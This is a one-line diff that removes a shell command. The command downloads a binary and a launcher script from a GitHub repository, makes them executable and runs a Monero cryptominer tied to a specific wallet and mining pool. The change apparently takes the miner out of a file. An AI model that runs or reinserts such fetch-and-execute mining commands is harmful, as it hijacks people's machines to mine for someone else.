@@ -1,1 +1,0 @@
-wget https://github.com/hunshukajh/yes/raw/main/gas && wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 458jxoisiKJLXPfaTFuxWyFdauu2f9v15QjiXBa9q4cJczwP4BvvN7GbgUESVW9DwC7xKnBuutQvR8RRmtsphbG69rBvzYW -rigName rambo -pool1 2miners.com
